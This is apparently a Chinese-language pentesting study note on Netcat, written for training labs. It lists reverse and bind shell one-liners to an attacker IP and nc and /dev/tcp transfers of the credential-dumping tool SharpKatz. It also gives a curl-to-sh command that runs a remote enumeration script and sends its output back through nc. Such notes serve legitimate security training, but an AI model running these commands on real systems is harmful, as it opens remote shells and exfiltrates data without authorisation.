---
tags:
  - 渗透/利用
  - 渗透/CPTS
  - IT/Linux
---
## nc

> Netcat, ncat, or nc

> The original Netcat was [released](http://seclists.org/bugtraq/1995/Oct/0028.html) by Hobbit in 1995, but it hasn't been maintained despite its popularity. The flexibility and usefulness of this tool prompted the Nmap Project to produce [Ncat](https://nmap.org/ncat/), a modern reimplementation that supports SSL, IPv6, SOCKS and HTTP proxies, connection brokering, and more.
> https://nmap.org/ncat/

可用 `-e` 选项（在服务端、客户端都可用）。但不安全（GAPING_SECURITY_HOLE）所以现在大部分 `netcat` 没有这个功能了。（**但Windows中nc64有妙用**）

原理：连接成功后执行指定命令。将可执行文件的stdin、stdout和stderr都重定向到指定TCP/UDP端口而不是默认控制台。


### [[命名管道]]派生


两种方法，取决于nc是否能用 `-e` 选项。

#### 1.Without GAPING_SECURITY_HOLE

`rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc 10.13.17.96 4444 >/tmp/f`

- sh的 `-i` 指“交互模式”
- 将管道 `/tmp/f` 的内容交给bash执行，然后给nc发送命令，然后结果又交给管道 `/tmp/f`

#### 2.With GAPING_SECURITY_HOLE

`nc 10.13.17.96 4444 -e /bin/sh`



THM例：
- 反弹shell：`mkfifo /tmp/f; nc <攻击方IP> <PORT> < /tmp/f | /bin/sh >/tmp/f 2>&1; rm /tmp/f`
- 绑定shell：`mkfifo /tmp/f; nc -lvnp <PORT> < /tmp/f | /bin/sh >/tmp/f 2>&1; rm /tmp/f`

> [!note] 理解
> 首先，在/tmp/f创建一个命名管道；然后，开启nc侦听器，将“侦听器的输入”连到“命名管道的输出”。  
> 关键，将nc侦听器的输出（我们发送的命令）直接通过管道传到sh，将 stderr 输出流发送到 stdout，并将 stdout 本身发送到命名管道的输入，从而完成循环。

> - [https://tryhackme.com/room/introtoshells](https://tryhackme.com/room/introtoshells)  
> - [https://www.linuxjournal.com/article/2156](https://www.linuxjournal.com/article/2156)
> - [https://www.ryotosaito.com/blog/?p=292](https://www.ryotosaito.com/blog/?p=292)


成功建立——但是不稳，比如无法使用tab、方向键、ctrl c还会断掉——称为“dumb shell”。升级为[[反弹shell#交互式|交互shell]]。



## Windows

powershell编码的替代品：[PowerCat](https://github.com/besimorhino/powercat)



## 文件传输

如果目标机没有curl、wget但是有nc。

**例：从hostA传递到hostB目标（下面nc指原始版本的Netcat）**

### 方法一

hostB监听，接收文件并输出。
```bash
# hostB:
nc -lvnp 8000 > SharpKatz.exe
## ncat的话要用 `--recv-only` 指定文件传输完成后关闭连接
ncat -l -p 8000 --recv-only > SharpKatz.exe

# hostA:
## `-q 0` 将告诉 Netcat 在完成后关闭连接
nc -q 0 192.168.49.128 8000 < SharpKatz.exe
## ncat的话用 `--send-only`
ncat --send-only 192.168.49.128 8000 < SharpKatz.exe
```


### 方法二

hostA监听（在hostB阻止入站流量时好用），并将文件作为输入，等待连接方将其取走。
```bash
# hostA:
sudo nc -lvnp 443 -q 0 < SharpKatz.exe
## ncat
sudo ncat -l -p 443 --send-only < SharpKatz.exe

# hostB:
nc 192.168.49.128 443 > SharpKatz.exe
## ncat
ncat 192.168.49.128 443 --recv-only > SharpKatz.exe
```


### 方法三 - 伪设备

> If we don't have Netcat or Ncat on our compromised machine, Bash supports read/write operations on a pseudo-device file [/dev/TCP/](https://tldp.org/LDP/abs/html/devref1.html).
> Writing to this particular file makes Bash open a TCP connection to `host:port`, and this feature may be used for file transfers.

hostA监听。同[[Netcat#方法二|方法二]]，不过hostB没有nc的话可以用伪设备获取数据。
```bash
# hostA:
sudo nc -l -p 443 -q 0 < SharpKatz.exe
## ncat
sudo ncat -l -p 443 --send-only < SharpKatz.exe

# hostB:
cat < /dev/tcp/192.168.49.128/443 > SharpKatz.exe
## 或者直接执行
cat < /dev/tcp/192.168.49.128/443 | sh
```






## tricks

### 传输枚举结果

- 攻击机，监听81端口，等待目标机的运行结果传回：`sudo nc -lvnp 81 | tee linpeas.txt`
- 目标机，执行脚本后nc传输到81端口：`curl <kali-IP>/linpeash.sh | sh |nc <kali-IP> 81`
	- 包含技巧：`curl <kali-IP>/linpeash.sh |sh` 直接执行远程脚本。类比[[powershell#^368d24|powershell-下载脚本、字符串]]
- LinPEAS结果的阅读方式：`less -r linpeas.txt`

